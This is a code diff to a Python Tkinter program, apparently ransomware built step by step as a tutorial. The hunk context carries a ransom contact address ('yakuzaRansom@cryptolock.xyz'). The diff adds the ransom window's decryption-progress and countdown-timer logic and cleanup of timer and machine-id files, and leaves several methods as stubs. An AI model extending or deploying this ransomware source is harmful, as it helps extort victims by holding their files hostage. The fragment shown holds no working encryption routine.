@@ -905,8 +905,6 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
         messagebox.showwarning("Decryption Incomplete",
                                f"Decryption completed for {decrypted_count} out of {total_files} files.")
 
-    # TODO Until Step 40, define show_incomplete_message() function
-
 
     def load_timer_state(self):
         pass
@@ -920,15 +918,38 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
         self.progress["value"] = value
         self.progress["maximum"] = maximum
         percentage = 100 * (value/maximum) if maximum else 0
-        self.progress_label.config(text=f"Decryption Progress: {percentage:.2f}%")
+        self.progressLabel.config(text=f"Decryption Progress: {percentage:.2f}%")
 
-
+    # Function to Stop Timer and Show Success Message
     def stop_timer_and_show_success(self):
+        if self.timerUpdateId:
+            # Set timer on the 0(None)
+            self.after_cancel(self.timerUpdateId)
+            self.timerUpdateId = None
+
+            # Show the success message
+            successMessage = "All files decrypted successfully. Thank you for your patience."
+            messagebox.showinfo("Decryption Complete", successMessage)
+
+            # Delete timer and machine id files
+            self.delete_timer_and_machine_id_files()
+            self.delete_timer_state_file()
+            countdownDialog = CountdownDialog(self, 10, self.close_application)
+            countdownDialog.mainloop()
+
+    def close_application(self):
         pass
 
 
     def decrypt_file(self, file_path, key):
         pass
+
+    def delete_timer_and_machine_id_files(self):
+        pass
+
+    def delete_timer_state_file(self):
+        pass
+
 
 if __name__ == "__main__":
     # Create an instance of the EncryptionTool class
